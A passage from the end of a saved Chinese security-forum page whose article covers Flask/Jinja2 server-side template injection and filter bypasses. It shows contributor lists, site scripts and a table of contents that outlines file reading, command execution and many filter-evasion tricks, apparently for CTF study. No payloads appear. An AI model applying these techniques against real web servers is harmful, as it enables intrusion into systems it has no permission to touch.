                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/54941" title="1794205309262390" style="">1794205309262390</a>
                            <span class="num-box">
                                <span class="badge badge-important">3</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/49315_e954e2786775c5324a.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49315" title="倩倩大魔王" style="">倩倩大魔王</a>
                            <span class="num-box">
                                <span class="badge badge-important">2</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49710" title="忘川安全" style="">忘川安全</a>
                            <span class="num-box">
                                <span class="badge badge-important">2</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/70845" title="1000303887847998" style="">1000303887847998</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
            </div>
        </div>

    </div>
</div>

    <div class="box sfixed" id="toc-container" style="width: 257px;">
        <div class="panel-info">
            <div class="panel-heading">
                <h4>目录</h4>
            </div>
            <div id="toc">
                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 518px;"></div>
            <ol style="top: -288px;"><li><a href="https://xz.aliyun.com/t/9584#toc-0">SSTI 中常用的魔术方法</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-1">利用 SSTI 读取文件</a><ol><li><a href="https://xz.aliyun.com/t/9584#toc-2">Python 2</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-3">Python 3</a></li></ol></li><li><a href="https://xz.aliyun.com/t/9584#toc-4">利用 SSTI 执行命令</a><ol><li><a href="https://xz.aliyun.com/t/9584#toc-5">寻找内建函数 eval 执行命令</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-6">寻找 os 模块执行命令</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-7">寻找 popen 函数执行命令</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-8">寻找 importlib 类执行命令</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-9">寻找 linecache 函数执行命令</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-10">寻找 subprocess.Popen 类执行命令</a></li></ol></li><li><a href="https://xz.aliyun.com/t/9584#toc-11">关键字绕过</a><ol><li><a href="https://xz.aliyun.com/t/9584#toc-12">利用字符串拼接绕过</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-13">利用编码绕过</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-14">利用Unicode编码绕过关键字（flask适用）</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-15">利用Hex编码绕过关键字</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-16">利用引号绕过</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-17">利用join()函数绕过</a></li></ol></li><li><a href="https://xz.aliyun.com/t/9584#toc-18">绕过其他字符</a><ol><li><a href="https://xz.aliyun.com/t/9584#toc-19">过滤了中括号[ ]</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-20">过滤了引号</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-21">过滤了下划线__</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-22">过滤了点 .</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-23">过滤了大括号 {{</a></li></ol></li><li><a href="https://xz.aliyun.com/t/9584#toc-24">利用 |attr() 来Bypass</a><ol><li><a href="https://xz.aliyun.com/t/9584#toc-25">同时过滤了 . 和 []</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-26">同时过滤了 __ 、点. 和 []</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-27">用Unicode编码配合 |attr() 进行Bypass</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-28">用Hex编码配合 |attr() 进行Bypass</a></li></ol></li><li><a href="https://xz.aliyun.com/t/9584#toc-29">使用 JinJa 的过滤器进行Bypass</a><ol><li><a href="https://xz.aliyun.com/t/9584#toc-30">常用字符获取入口点</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-31">[2020 DASCTF 八月安恒月赛]ezflask</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-32">[2021 MAR &amp; DASCTF]baby_flask</a></li></ol></li><li><a href="https://xz.aliyun.com/t/9584#toc-33">过滤了request和class</a><ol><li><a href="https://xz.aliyun.com/t/9584#toc-34">[NCTF2018]flask真香</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-35">[NCTF2018]Flask PLUS</a></li></ol></li><li><a href="https://xz.aliyun.com/t/9584#toc-36">没有回显的 SSTI</a></li><li><a href="https://xz.aliyun.com/t/9584#toc-37">未完待续……</a></li></ol></div>
        </div>
    </div>
    <div style="clear: both;"></div>


    <script type="text/javascript">
        $(function () {
            $(".charts").click(switchChart);
            $("[data-toggle='tooltip']").tooltip();

            function switchChart() {
                let _this = $(this);
                let idx = _this.attr("data-type")
                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
                if (!_this.hasClass("active")) {
                    _this.addClass("active").siblings().removeClass("active")
                    content.show().siblings().hide()
                }
            }
        })
    </script>


    <style>

    </style>


        </div>
    </div>


</div>
<footer class="bs-docs-footer" translate="no">
    <div class="container text-center">
        <div class="links">
            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
        </div>
    </div>
</footer>

<script src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/bootstrap.min.js.下载"></script>
<script src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/xz.js.下载"></script>


    
    <script type="text/javascript">
        $(document).ready(function () {
            voteUp = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/up/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9584&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-up').html(data.html);
                                }
                            }
                        }
                    });
                }
            };
            voteDown = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/down/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9584&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-down').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
            
            $("[data-toggle='tooltip']").tooltip();
        });
    </script>


    <script src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/z_stat.php"></script>


</body></html>